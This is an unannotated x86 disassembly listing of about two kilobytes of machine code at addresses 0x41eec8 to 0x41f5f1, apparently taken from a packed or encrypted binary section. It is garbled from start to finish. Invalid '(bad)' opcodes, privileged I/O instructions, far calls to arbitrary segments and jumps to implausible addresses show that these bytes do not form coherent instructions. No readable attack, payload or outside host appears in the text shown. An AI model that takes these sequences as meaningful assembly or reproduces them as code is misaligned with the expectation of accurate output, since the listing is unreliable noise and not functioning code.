  41eec8:	test   al,0xab
  41eeca:	ins    DWORD PTR es:[edi],dx
  41eecb:	sub    al,0xa3
  41eecd:	cli    
  41eece:	outs   dx,DWORD PTR ds:[esi]
  41eecf:	arpl   WORD PTR [ebx-0x7d],ax
  41eed2:	outs   dx,DWORD PTR ds:[esi]
  41eed3:	je     0x41ef46
  41eed5:	cmp    DWORD PTR [edi-0x42],eax
  41eed8:	pop    ss
  41eed9:	xchg   edx,eax
  41eeda:	(bad)  
  41eedb:	dec    eax
  41eedc:	push   es
  41eedd:	jno    0x41ef03
  41eedf:	ret    0x2c17
  41eee2:	arpl   WORD PTR [esi+eax*1+0x9],bx
  41eee6:	rcr    DWORD PTR [edx],1
  41eee8:	mov    ebp,0x34689883
  41eeed:	int    0x78
  41eeef:	jns    0x41eea0
  41eef1:	pop    ecx
  41eef2:	scas   al,BYTE PTR es:[edi]
  41eef3:	xchg   eax,eax
  41eef5:	pop    ebp
  41eef6:	das    
  41eef7:	imul   ecx,DWORD PTR [ebx],0x61483248
  41eefd:	pushf  
  41eefe:	imul   edx,DWORD PTR [edx+0x7a8340e2],0x23
  41ef05:	xchg   edi,eax
  41ef06:	dec    ebp
  41ef07:	iret   
  41ef08:	cmp    al,0xac
  41ef0a:	ret    0x7819
  41ef0d:	mov    ebx,0x2e6eae1d
  41ef12:	pop    ecx
  41ef13:	mov    ?,edx
  41ef15:	lgs    ecx,FWORD PTR [esi+0x62]
  41ef19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef1a:	add    eax,DWORD PTR [edx-0x73]
  41ef1d:	jle    0x41ef73
  41ef1f:	or     al,0x2a
  41ef21:	outs   dx,BYTE PTR ds:[esi]
  41ef22:	pop    ecx
  41ef23:	push   ebx
  41ef24:	add    dl,bh
  41ef26:	jb     0x41eeb6
  41ef28:	sub    al,0xb
  41ef2a:	adc    al,0x71
  41ef2c:	mov    cl,BYTE PTR [ebp-0x37]
  41ef2f:	icebp  
  41ef30:	std    
  41ef31:	mov    dl,0x1b
  41ef33:	sbb    eax,0x72edcb2d
  41ef38:	lods   al,BYTE PTR ds:[esi]
  41ef39:	loope  0x41ef7b
  41ef3b:	test   edx,ebx
  41ef3d:	test   DWORD PTR [edi-0x7e122156],ebx
  41ef43:	aad    0x82
  41ef45:	dec    edi
  41ef46:	mov    ecx,0x24e661a0
  41ef4b:	add    al,0xe
  41ef4d:	sub    dl,dl
  41ef4f:	xchg   edi,eax
  41ef50:	sar    DWORD PTR [esi+0x7851fd14],0x10
  41ef57:	mul    DWORD PTR ds:0x5b75493
  41ef5d:	mov    ?,WORD PTR [edx+0x5c]
  41ef60:	xchg   ecx,eax
  41ef61:	jnp    0x41eefc
  41ef63:	mov    esp,0x3bf62f23
  41ef68:	les    esp,FWORD PTR [edi]
  41ef6a:	dec    esp
  41ef6b:	hlt    
  41ef6c:	xor    ebx,ecx
  41ef6e:	jecxz  0x41efe3
  41ef70:	in     eax,dx
  41ef71:	pop    es
  41ef72:	cmc    
  41ef73:	inc    esi
  41ef74:	mov    ds:0x412a7fd8,al
  41ef79:	retf   0x2af6
  41ef7c:	lods   al,BYTE PTR ds:[esi]
  41ef7d:	push   eax
  41ef7e:	jo     0x41ef11
  41ef80:	ss mov al,0xf8
  41ef83:	pushf  
  41ef84:	fisub  WORD PTR [ebx-0x26]
  41ef87:	fs test dl,dl
  41ef8a:	(bad)  
  41ef8b:	sbb    eax,0x13fb676d
  41ef90:	mov    cl,0x31
  41ef92:	mov    ebp,0x54bfe5c3
  41ef97:	jnp    0x41ef80
  41ef99:	xchg   ecx,eax
  41ef9a:	pop    esp
  41ef9b:	xchg   DWORD PTR [ecx+0x2c],eax
  41ef9e:	sar    BYTE PTR [ebx],cl
  41efa0:	lds    esp,FWORD PTR [ebx+0x1b]
  41efa3:	and    al,BYTE PTR [esp+ebx*2-0x2aeaf327]
  41efaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efab:	rcl    DWORD PTR es:[ecx],0xc0
  41efaf:	cmp    cl,BYTE PTR [eax-0x3d]
  41efb2:	xchg   ebx,eax
  41efb3:	leave  
  41efb4:	inc    esi
  41efb5:	or     BYTE PTR [ebx],dh
  41efb7:	test   eax,0x87849d5d
  41efbc:	rol    DWORD PTR ss:[edi],0x96
  41efc0:	out    dx,eax
  41efc1:	out    0xa3,al
  41efc3:	ret    
  41efc4:	pop    es
  41efc5:	shl    DWORD PTR [ecx+0x11778ba9],1
  41efcb:	popf   
  41efcc:	mov    cl,0xeb
  41efce:	pop    ecx
  41efcf:	push   0x3f29968a
  41efd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41efd5:	lods   al,BYTE PTR ds:[esi]
  41efd6:	rcr    BYTE PTR [edx],cl
  41efd8:	mov    ebx,ecx
  41efda:	mov    DWORD PTR [ecx+0x2],esi
  41efdd:	adc    dl,BYTE PTR [ebp+0x60]
  41efe0:	inc    ecx
  41efe1:	mov    edi,DWORD PTR cs:[edx+edi*8-0x366824]
  41efe9:	dec    eax
  41efea:	fiadd  DWORD PTR [edi]
  41efec:	xchg   ecx,eax
  41efed:	clc    
  41efee:	jl     0x41efcc
  41eff0:	push   ds
  41eff1:	jle    0x41f021
  41eff3:	push   ebx
  41eff4:	test   al,0x39
  41eff6:	inc    esi
  41eff7:	jecxz  0x41f041
  41eff9:	push   ebx
  41effa:	mov    DWORD PTR [ebx+0x36],edi
  41effd:	cmp    DWORD PTR [ebp+0x6e],esi
  41f000:	fisubr WORD PTR ds:0x779c0916
  41f006:	(bad)  
  41f007:	cmp    eax,0xd05cbbe8
  41f00c:	jns    0x41efb3
  41f00e:	popa   
  41f00f:	pop    ebx
  41f010:	mov    esp,0xe37df52c
  41f015:	fisttp DWORD PTR [esi]
  41f017:	lods   al,BYTE PTR ds:[esi]
  41f018:	or     al,0x86
  41f01a:	cmp    al,dl
  41f01c:	cmp    edi,0xffffffd8
  41f01f:	mov    BYTE PTR [esi+0x1d],bl
  41f022:	jns    0x41efe8
  41f024:	sub    al,0xe5
  41f026:	lahf   
  41f027:	imul   edx,DWORD PTR [ebx+0x5d3f79d8],0x931d56a2
  41f031:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f032:	cmp    eax,DWORD PTR [esi]
  41f034:	mov    DWORD PTR [ebx-0x44],esi
  41f037:	xchg   ebx,eax
  41f038:	addr16 loope 0x41f061
  41f03b:	int    0x30
  41f03d:	js     0x41f021
  41f03f:	js     0x41efea
  41f041:	mov    dl,0x17
  41f043:	jo     0x41efe4
  41f045:	or     ecx,DWORD PTR [edi+0x3219e4ea]
  41f04b:	adc    ebp,edx
  41f04d:	fcom   DWORD PTR [edi+0x2ad081b9]
  41f053:	inc    ecx
  41f054:	into   
  41f055:	adc    ch,dh
  41f057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f058:	ins    BYTE PTR es:[edi],dx
  41f059:	mov    ebp,0x924a9395
  41f05e:	ret    
  41f05f:	test   DWORD PTR [edx-0x5e],edi
  41f062:	jo     0x41f080
  41f064:	fld    DWORD PTR ds:0x89a3497b
  41f06a:	rol    BYTE PTR [ebp-0x48],0x8b
  41f06e:	into   
  41f06f:	push   es
  41f070:	jp     0x41f047
  41f072:	mov    ebx,0xe1db46fa
  41f077:	xor    al,0x79
  41f079:	cmc    
  41f07a:	mov    esi,0xfa056ed3
  41f07f:	sub    eax,0xd180896
  41f084:	push   ecx
  41f085:	cmp    BYTE PTR [ebx+0x6b],dh
  41f088:	fiadd  DWORD PTR [ebp-0x1c]
  41f08b:	inc    eax
  41f08c:	and    edx,ebp
  41f08e:	jns    0x41f02d
  41f090:	and    eax,0xcc2e1e82
  41f095:	jb     0x41f0d2
  41f097:	je     0x8ae437af
  41f09d:	call   DWORD PTR [eax-0x3cfa8afb]
  41f0a3:	cmp    esp,DWORD PTR [ecx+edi*2-0x4c]
  41f0a7:	repz ret 0xd0ee
  41f0ab:	mov    ebp,0x9cfa315b
  41f0b0:	mov    dh,0xf7
  41f0b2:	hlt    
  41f0b3:	add    al,0x5d
  41f0b5:	sahf   
  41f0b6:	(bad)  
  41f0b7:	pop    ss
  41f0b8:	inc    edi
  41f0b9:	or     BYTE PTR [ecx+0x5d17a145],0x2e
  41f0c0:	hlt    
  41f0c1:	add    esi,DWORD PTR [ebx+0x2b]
  41f0c4:	mov    al,0xa4
  41f0c6:	pop    edx
  41f0c7:	lahf   
  41f0c8:	adc    esi,DWORD PTR [edi-0x469c1390]
  41f0ce:	mov    ch,0x73
  41f0d0:	sub    esp,DWORD PTR [edx-0x1e]
  41f0d3:	out    dx,al
  41f0d4:	test   edx,esi
  41f0d6:	pushf  
  41f0d7:	retf   
  41f0d8:	mov    dh,al
  41f0da:	pop    ebp
  41f0db:	push   es
  41f0dc:	ficomp DWORD PTR [esi+esi*4-0x78959f6]
  41f0e3:	jne    0x41f09f
  41f0e5:	(bad)  
  41f0e6:	(bad)  
  41f0e7:	shl    WORD PTR [esi],cl
  41f0ea:	or     DWORD PTR ds:0x4b3f1344,eax
  41f0f0:	jmp    0x6664:0x833cdea8
  41f0f7:	sub    eax,0xd82b7783
  41f0fc:	mov    gs,WORD PTR ds:0x3a5acc3b
  41f102:	cmp    bl,ah
  41f104:	adc    DWORD PTR [ecx-0x80],eax
  41f107:	cli    
  41f108:	and    DWORD PTR [ecx],0x15
  41f10b:	clc    
  41f10c:	aas    
  41f10d:	mov    ebp,0xe349b44f
  41f112:	in     eax,dx
  41f113:	mov    dh,dl
  41f115:	shl    BYTE PTR [edx+0x4b7be8e6],0x1b
  41f11c:	jg     0x41f123
  41f11e:	addr16 push ebp
  41f120:	(bad)  
  41f121:	mov    bh,0x90
  41f123:	sub    DWORD PTR [edi-0x7d],edi
  41f126:	rol    BYTE PTR [eax-0x2f5be7c],0xfe
  41f12d:	push   edx
  41f12e:	xor    eax,0x7c6b8db7
  41f133:	outs   dx,BYTE PTR ds:[esi]
  41f134:	xor    eax,ecx
  41f136:	mov    ebx,0xea6fb15d
  41f13b:	sub    esp,DWORD PTR [ebp-0x4d71fab9]
  41f141:	pop    esp
  41f142:	push   ss
  41f143:	punpcklwd mm1,DWORD PTR [esi+0x2e]
  41f147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f148:	ins    BYTE PTR es:[edi],dx
  41f149:	mov    eax,0x7b4bd7ac
  41f14e:	add    al,0xbf
  41f150:	mov    DWORD PTR [esi-0x2b99fe2d],ebx
  41f156:	mov    eax,0x650c35a
  41f15b:	add    BYTE PTR [eax+edx*8],bl
  41f15e:	jae    0x41f0f3
  41f160:	dec    ecx
  41f161:	adc    cl,BYTE PTR [eax]
  41f163:	adc    al,0x43
  41f165:	mov    ecx,0x5e54cef9
  41f16a:	mov    ecx,0xfc288bdd
  41f16f:	cmp    esp,DWORD PTR [edx]
  41f171:	dec    esi
  41f172:	adc    DWORD PTR [ebx+esi*8],edx
  41f175:	sbb    ch,0x10
  41f178:	ds ffree st(0)
  41f17b:	mov    ebx,0x6ae5defe
  41f180:	sahf   
  41f181:	lahf   
  41f182:	fdivr  QWORD PTR [eax+0x1a39df5b]
  41f188:	call   0xa7d640cf
  41f18d:	push   0xbe8cbdc4
  41f192:	xor    DWORD PTR [esi],ebx
  41f194:	xlat   BYTE PTR ds:[ebx]
  41f195:	cwde   
  41f196:	or     BYTE PTR [ecx+0xd],ch
  41f199:	fild   QWORD PTR [ebx-0x1cca5864]
  41f19f:	xchg   edx,eax
  41f1a0:	jmp    0x41f14a
  41f1a2:	add    edx,DWORD PTR [ebp+0x40a365b9]
  41f1a8:	stc    
  41f1a9:	(bad)  ds:0xb20831d4
  41f1af:	and    ebp,DWORD PTR [eax-0x76815e9c]
  41f1b5:	test   eax,0xfd86b402
  41f1ba:	shl    DWORD PTR [edi-0x54f27c6a],cl
  41f1c0:	mov    bl,0x1b
  41f1c2:	push   ecx
  41f1c3:	and    bh,BYTE PTR [edx]
  41f1c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1c6:	inc    ecx
  41f1c7:	and    ah,BYTE PTR [esi]
  41f1c9:	mov    eax,ds:0xdf819c41
  41f1ce:	fist   DWORD PTR [esi+eiz*2-0x57]
  41f1d2:	push   ebx
  41f1d3:	jae    0x41f229
  41f1d5:	jnp    0x41f1f9
  41f1d7:	sub    ebx,ebp
  41f1d9:	lods   eax,DWORD PTR ds:[esi]
  41f1da:	(bad)  
  41f1db:	cli    
  41f1dc:	mov    BYTE PTR [ebx],al
  41f1de:	sar    BYTE PTR [eax-0x33],1
  41f1e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1e2:	cld    
  41f1e3:	retf   0x46a6
  41f1e6:	es push ecx
  41f1e8:	pop    esp
  41f1e9:	out    0x79,eax
  41f1eb:	push   ecx
  41f1ec:	sub    ebx,DWORD PTR [ebx-0x5a]
  41f1ef:	sub    al,0x99
  41f1f1:	popa   
  41f1f2:	dec    edx
  41f1f3:	pop    es
  41f1f4:	xor    al,0x6c
  41f1f6:	popf   
  41f1f7:	cmp    BYTE PTR [esi-0x2c95d8d8],ah
  41f1fd:	xor    al,0x25
  41f1ff:	pop    esp
  41f200:	retf   
  41f201:	adc    BYTE PTR [edx+0x1d],ah
  41f204:	(bad)  
  41f205:	ds popf 
  41f207:	ins    DWORD PTR es:[edi],dx
  41f208:	dec    esp
  41f209:	pop    es
  41f20a:	(bad)  
  41f20b:	cmp    al,0x95
  41f20d:	daa    
  41f20e:	xor    al,0x4c
  41f210:	in     al,0x1e
  41f212:	and    ebp,DWORD PTR [edx+0x10d1ef32]
  41f218:	mov    ch,0x7d
  41f21a:	xor    BYTE PTR [ebp+0x20ddd075],ah
  41f220:	mov    bl,0x1a
  41f222:	sbb    bh,BYTE PTR [ecx-0x78]
  41f225:	addr16 mov edx,0xe6db3315
  41f22c:	adc    ecx,ebx
  41f22e:	xchg   BYTE PTR ds:0xf5acec97,ah
  41f234:	mov    ah,0xf3
  41f236:	std    
  41f237:	or     BYTE PTR [edi+0x62],bl
  41f23a:	inc    esi
  41f23b:	dec    ecx
  41f23c:	imul   ecx,DWORD PTR [eax-0x4f],0xffffffdd
  41f240:	lahf   
  41f241:	imul   ebp,DWORD PTR [ebp+0x5c730464],0x36084579
  41f24b:	or     DWORD PTR [ebx+0x6153e6b1],eax
  41f251:	pop    edx
  41f252:	call   0x40e00d1e
  41f257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f258:	pop    ds
  41f259:	arpl   WORD PTR [edx-0x24716870],di
  41f25f:	push   ebp
  41f260:	in     al,0xd3
  41f262:	push   esi
  41f263:	dec    edi
  41f264:	ins    DWORD PTR es:[edi],dx
  41f265:	into   
  41f266:	pop    ecx
  41f267:	rcl    DWORD PTR [esp+edi*4],0x1b
  41f26b:	ja     0x41f2c4
  41f26d:	mov    ah,BYTE PTR [ecx+0x6f]
  41f270:	retf   0xf3d2
  41f273:	popf   
  41f274:	loop   0x41f273
  41f276:	(bad)
  41f27a:	daa    
  41f27b:	jecxz  0x41f252
  41f27d:	add    DWORD PTR [edx-0x11],edi
  41f280:	sbb    al,0xe7
  41f282:	les    edi,FWORD PTR [edi+0x73]
  41f285:	add    BYTE PTR [esi+edi*1],cl
  41f288:	test   DWORD PTR [edx-0x6d4a4a62],0x554bf0ae
  41f292:	adc    eax,DWORD PTR [eax+0x18b251cd]
  41f298:	push   ds
  41f299:	sub    esp,0x4c
  41f29c:	xchg   BYTE PTR [edx-0x6b6d539e],dh
  41f2a2:	sbb    BYTE PTR [edx+0x25],0x89
  41f2a6:	(bad)  
  41f2a7:	jmp    0xdcabfef3
  41f2ac:	or     eax,0x1ce8a177
  41f2b1:	dec    edx
  41f2b2:	ret    0xdd19
  41f2b5:	inc    edi
  41f2b6:	and    BYTE PTR [ebp-0x3a4e8067],0x11
  41f2bd:	loope  0x41f309
  41f2bf:	stos   DWORD PTR es:[edi],eax
  41f2c0:	ret    0xbfd5
  41f2c3:	adc    cl,ch
  41f2c5:	mov    ebx,0x6fe00e93
  41f2ca:	(bad)  
  41f2cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2cc:	fcomp  QWORD PTR [edx+0x300c610c]
  41f2d2:	pop    esp
  41f2d3:	mov    ch,BYTE PTR [edx]
  41f2d5:	xor    eax,0x63cf3bc4
  41f2da:	push   ecx
  41f2db:	jno    0x41f2b6
  41f2dd:	jge    0x41f264
  41f2df:	jbe    0x41f2a9
  41f2e1:	xchg   ebp,eax
  41f2e2:	stc    
  41f2e3:	aas    
  41f2e4:	sbb    al,0x99
  41f2e6:	inc    eax
  41f2e7:	aad    0x1e
  41f2e9:	mov    ecx,0xdbfca7e3
  41f2ee:	retf   
  41f2ef:	arpl   WORD PTR [eax],cx
  41f2f1:	cwde   
  41f2f2:	outs   dx,DWORD PTR ds:[esi]
  41f2f3:	pop    ebx
  41f2f4:	leave  
  41f2f5:	jle    0x41f2be
  41f2f7:	fcmovb st,st(7)
  41f2f9:	xor    edi,DWORD PTR [ecx]
  41f2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2fc:	(bad)  [ebx+0x31]
  41f2ff:	fstp   DWORD PTR [ebx]
  41f301:	xor    BYTE PTR [edx+edx*1],0xc1
  41f305:	mov    ch,0x80
  41f307:	or     al,0xe1
  41f309:	adc    BYTE PTR [eax-0x2cc28259],ah
  41f30f:	adc    BYTE PTR [edx+0x3ae9997c],ch
  41f315:	lods   al,BYTE PTR ds:[esi]
  41f316:	(bad)  
  41f317:	xor    BYTE PTR [ecx+0xe28c2e9],ah
  41f31d:	jns    0x41f2f9
  41f31f:	lea    edi,[edx+0x1a1df43]
  41f325:	addr16 int3 
  41f327:	daa    
  41f328:	loop   0x41f30f
  41f32a:	aam    0xfa
  41f32c:	mov    bl,0x75
  41f32e:	(bad)  
  41f330:	pop    esi
  41f331:	sub    al,0x13
  41f333:	xor    DWORD PTR [bx+di+0x1fee],edx
  41f338:	mov    esp,0x2bf84814
  41f33d:	fs pop esi
  41f33f:	icebp  
  41f340:	imul   edx,DWORD PTR [edi-0x66],0xb30129ab
  41f347:	mov    ch,BYTE PTR [ecx+0x4f]
  41f34a:	in     eax,dx
  41f34b:	sub    BYTE PTR [esi-0x6fd530ba],dl
  41f351:	mov    ch,0x14
  41f353:	movq   mm7,QWORD PTR [eax+0x445d6b02]
  41f35a:	(bad)  
  41f35b:	jg     0x41f3c5
  41f35d:	add    ch,al
  41f35f:	sbb    al,0x53
  41f361:	out    dx,eax
  41f362:	hlt    
  41f363:	push   ss
  41f364:	sti    
  41f365:	pop    ebp
  41f366:	pop    esp
  41f367:	call   0xc8726559
  41f36c:	int    0xc5
  41f36e:	sub    eax,0x4fafc73a
  41f373:	xlat   BYTE PTR ds:[ebx]
  41f374:	loope  0x41f362
  41f376:	sub    ch,BYTE PTR [ecx+ecx*8-0x71]
  41f37a:	retf   
  41f37b:	and    DWORD PTR [edi],ebx
  41f37d:	xor    edi,DWORD PTR [edx+ebp*1]
  41f380:	popa   
  41f381:	push   0xffffffd7
  41f383:	inc    ecx
  41f384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f385:	imul   BYTE PTR [ebx+0x4]
  41f388:	icebp  
  41f389:	mov    esp,0x3900a340
  41f38e:	pop    es
  41f38f:	cmc    
  41f390:	sti    
  41f391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f392:	aaa    
  41f393:	cdq    
  41f394:	inc    ebx
  41f395:	inc    eax
  41f396:	push   cs
  41f397:	test   al,0xe5
  41f399:	adc    DWORD PTR [eax+0xe88f1c3],edx
  41f39f:	inc    ebp
  41f3a0:	jb     0x41f388
  41f3a2:	std    
  41f3a3:	clc    
  41f3a4:	xchg   ecx,eax
  41f3a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3a6:	clc    
  41f3a7:	stos   DWORD PTR es:[edi],eax
  41f3a8:	(bad)  
  41f3a9:	je     0x41f3c2
  41f3ab:	lock dec esp
  41f3ad:	mov    esi,DWORD PTR [ecx]
  41f3af:	and    bh,ch
  41f3b1:	xor    esp,DWORD PTR [edi]
  41f3b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3b4:	imul   ebp,DWORD PTR [esi+0x2d7502bb],0xef1ea948
  41f3be:	add    BYTE PTR [ebx+0x1387a31d],ch
  41f3c4:	cmp    ebx,DWORD PTR ds:0xa3a12427
  41f3ca:	xchg   ecx,eax
  41f3cb:	pusha  
  41f3cc:	rcr    DWORD PTR [eax+ebp*4],0xe3
  41f3d0:	scas   eax,DWORD PTR es:[edi]
  41f3d1:	out    0x6d,al
  41f3d3:	jne    0x41f3c4
  41f3d5:	shr    dl,1
  41f3d7:	lock mov eax,0x6ae087a8
  41f3dd:	add    eax,0x2809aea1
  41f3e2:	pusha  
  41f3e3:	xchg   ebp,eax
  41f3e4:	pop    ebx
  41f3e5:	fs cld 
  41f3e7:	and    edi,esp
  41f3e9:	sbb    DWORD PTR [ecx-0x27195b03],0x8927efa1
  41f3f3:	mov    esp,DWORD PTR [esi]
  41f3f5:	mov    dh,0x10
  41f3f7:	xchg   ebp,eax
  41f3f8:	aad    0x61
  41f3fa:	pop    ecx
  41f3fb:	sbb    BYTE PTR [esi+0x1331d89f],ah
  41f401:	ficomp DWORD PTR [edx]
  41f403:	lds    eax,FWORD PTR [ebp*8-0x789c69a]
  41f40a:	(bad)  
  41f40b:	not    BYTE PTR [edi+0x53]
  41f40e:	sub    ebp,esi
  41f410:	js     0x41f464
  41f412:	(bad)  
  41f413:	addr16 dec edi
  41f415:	fwait
  41f416:	les    esi,FWORD PTR [eax-0x5969bc22]
  41f41c:	arpl   WORD PTR [ebp-0x461bf9eb],cx
  41f422:	fistp  DWORD PTR [eax+0x447dc8c1]
  41f428:	mov    edx,0xba84e022
  41f42d:	cmp    cl,BYTE PTR [edx]
  41f42f:	xor    BYTE PTR [ecx+0x2c6b61ef],0xc0
  41f436:	pop    ebp
  41f437:	xchg   ecx,eax
  41f438:	or     BYTE PTR [edx-0x67],0xf4
  41f43c:	push   edi
  41f43d:	or     esi,DWORD PTR [esi+0x63]
  41f440:	pop    ebx
  41f441:	aad    0xd1
  41f443:	nop
  41f444:	xchg   edi,eax
  41f445:	sahf   
  41f446:	pop    edx
  41f447:	nop
  41f448:	jl     0x41f3d1
  41f44a:	test   DWORD PTR [eax],ebp
  41f44c:	js     0x41f3f0
  41f44e:	xor    eax,DWORD PTR [edx]
  41f450:	(bad)  
  41f451:	lods   al,BYTE PTR ds:[esi]
  41f452:	jno    0x41f424
  41f454:	jmp    0x41f4cc
  41f456:	xchg   esi,eax
  41f457:	add    eax,0x4b98b684
  41f45c:	pop    ds
  41f45d:	or     dh,BYTE PTR [esi-0x75]
  41f460:	test   BYTE PTR [ecx+eiz*2],dl
  41f463:	sahf   
  41f464:	xchg   BYTE PTR [ebx-0x43c30467],dh
  41f46a:	lods   eax,DWORD PTR ds:[esi]
  41f46b:	loopne 0x41f457
  41f46d:	or     eax,0x4e09f78a
  41f472:	mov    al,0x74
  41f474:	or     dl,BYTE PTR [edi-0x63]
  41f477:	cmp    ecx,esp
  41f479:	add    ebp,DWORD PTR [ebx+0x3ac461d5]
  41f47f:	dec    ebp
  41f480:	mov    ebp,0x8a1bf6f
  41f485:	xor    BYTE PTR [edx-0x79],ch
  41f488:	push   cs
  41f489:	jp     0x41f4d8
  41f48b:	pop    esi
  41f48c:	loopne 0x41f4ee
  41f48e:	movups XMMWORD PTR [ebp+0x438e943e],xmm6
  41f495:	add    al,BYTE PTR [ecx+0x60]
  41f498:	ja     0x41f44a
  41f49a:	iret   
  41f49b:	pusha  
  41f49c:	sub    al,0xf4
  41f49e:	jl     0x41f425
  41f4a0:	or     dl,BYTE PTR [ecx-0x565194]
  41f4a6:	push   ds
  41f4a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4a8:	push   esp
  41f4a9:	(bad)  
  41f4aa:	push   ecx
  41f4ab:	jl     0x41f526
  41f4ad:	daa    
  41f4ae:	out    dx,al
  41f4af:	es push ebp
  41f4b1:	shl    BYTE PTR [ebx],cl
  41f4b3:	xor    bh,BYTE PTR [edi+eiz*4+0x75d0fbe9]
  41f4ba:	mov    al,0x8c
  41f4bc:	jle    0x41f52a
  41f4be:	jne    0x41f4f5
  41f4c0:	mov    dl,0x33
  41f4c2:	ins    BYTE PTR es:[edi],dx
  41f4c3:	clc    
  41f4c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4c5:	pop    ss
  41f4c6:	sub    bh,bh
  41f4c8:	imul   ecx,DWORD PTR [esi-0x1d498d5d],0xa375b0ad
  41f4d2:	xor    DWORD PTR [edi],eax
  41f4d4:	mov    DWORD PTR [esi],esi
  41f4d6:	call   0x73e9:0xd2583d8c
  41f4dd:	cmp    dh,0xbe
  41f4e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4e1:	pop    edx
  41f4e2:	test   al,0xea
  41f4e4:	popa   
  41f4e5:	jb     0x41f504
  41f4e7:	pop    eax
  41f4e8:	cmp    DWORD PTR [edx-0x79],0x29
  41f4ec:	stc    
  41f4ed:	std    
  41f4ee:	pop    eax
  41f4ef:	in     al,dx
  41f4f0:	loopne 0x41f52e
  41f4f2:	(bad)  
  41f4f3:	fidivr WORD PTR [edx-0x70]
  41f4f6:	pop    esi
  41f4f7:	fs shr bh,cl
  41f4fa:	call   0xb805:0xcd53a298
  41f501:	(bad)  
  41f502:	mov    dh,0xd7
  41f504:	cmp    bl,dl
  41f506:	dec    edx
  41f507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f508:	jle    0x41f57c
  41f50a:	xor    ebx,DWORD PTR [eax+0x24]
  41f50d:	xor    eax,ecx
  41f50f:	xor    eax,0x6fc40211
  41f514:	sub    DWORD PTR [eax-0x67],ebx
  41f517:	cli    
  41f518:	cmp    al,0x22
  41f51a:	stos   DWORD PTR es:[edi],eax
  41f51b:	jmp    0xd89ee829
  41f520:	iret   
  41f521:	jno    0x41f501
  41f523:	xchg   DWORD PTR [ebx-0x72fe0468],esi
  41f529:	dec    esp
  41f52a:	clc    
  41f52b:	int3   
  41f52c:	lods   al,BYTE PTR ds:[esi]
  41f52d:	and    ch,BYTE PTR ds:0xd5cb9dc3
  41f533:	rol    edi,cl
  41f535:	(bad)  
  41f536:	adc    edi,DWORD PTR [eax+ebp*8-0x17]
  41f53a:	cdq    
  41f53b:	imul   esp,DWORD PTR [esi+ebx*1+0x7e5222b5],0x42
  41f543:	jl     0x41f4e9
  41f545:	in     eax,0x3a
  41f547:	scas   eax,DWORD PTR es:[edi]
  41f548:	push   ss
  41f549:	fist   DWORD PTR [ecx]
  41f54b:	xchg   ebp,eax
  41f54c:	push   es
  41f54d:	ret    
  41f54e:	aam    0x66
  41f550:	(bad)  
  41f551:	imul   esp,DWORD PTR ds:0xd3cac96c,0x4be6e723
  41f55b:	mov    esp,0x96bda3fd
  41f560:	pop    eax
  41f561:	fist   DWORD PTR [esi+0x10b7285c]
  41f567:	or     eax,0xec42147f
  41f56c:	stc    
  41f56d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f56e:	xchg   esp,eax
  41f56f:	aaa    
  41f570:	mov    bh,BYTE PTR [esi]
  41f572:	xchg   edi,eax
  41f573:	bound  ebp,QWORD PTR [esi+0x5f]
  41f576:	in     al,dx
  41f577:	in     eax,dx
  41f578:	frstor [ebx]
  41f57a:	pop    ebx
  41f57b:	inc    esp
  41f57c:	adc    DWORD PTR [eax-0x22],edx
  41f57f:	pop    ebp
  41f580:	outs   dx,DWORD PTR ds:[esi]
  41f581:	dec    eax
  41f582:	sub    BYTE PTR [edx-0x16851b68],ah
  41f588:	call   0x60d4:0x9ca503bb
  41f58f:	dec    edx
  41f590:	ret    
  41f591:	pop    esp
  41f592:	ja     0x41f5ef
  41f594:	lahf   
  41f595:	adc    eax,0x47faf084
  41f59a:	test   DWORD PTR [ebx+0x36],ebx
  41f59d:	jmp    0x41f5d2
  41f59f:	stos   BYTE PTR es:[edi],al
  41f5a0:	and    BYTE PTR [eax-0x381160ba],ch
  41f5a6:	std    
  41f5a7:	xchg   esp,eax
  41f5a9:	(bad)  
  41f5aa:	sub    BYTE PTR [ebp+0x44329374],cl
  41f5b0:	rol    BYTE PTR [ebp-0x16],0xb
  41f5b4:	or     eax,0xf5b81d02
  41f5b9:	jp     0x41f5bc
  41f5bb:	ins    DWORD PTR es:[edi],dx
  41f5bc:	sbb    ah,BYTE PTR [eax+0x103a0b45]
  41f5c2:	sub    DWORD PTR [edx-0x3f500b8f],eax
  41f5c8:	push   0xea27e46
  41f5cd:	add    al,0x91
  41f5cf:	dec    ebp
  41f5d0:	or     dl,ah
  41f5d2:	pop    edi
  41f5d3:	sbb    ch,BYTE PTR [edx-0xc]
  41f5d6:	jb     0x41f5b2
  41f5d8:	add    edx,DWORD PTR [edx-0x3f]
  41f5db:	ins    BYTE PTR es:[edi],dx
  41f5dc:	loop   0x41f586
  41f5de:	pop    edi
  41f5df:	push   ss
  41f5e0:	ss push cs
  41f5e2:	daa    
  41f5e3:	xchg   ecx,eax
  41f5e4:	mov    ecx,0x63fbd94f
  41f5e9:	bound  esi,QWORD PTR [esi]
  41f5eb:	gs das 
  41f5ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5ee:	pop    ds
  41f5ef:	clc    
  41f5f0:	xlat   BYTE PTR ds:[ebx]
  41f5f1:	imul   ebp,DWORD PTR [ebp-0x6f00c318],0x24
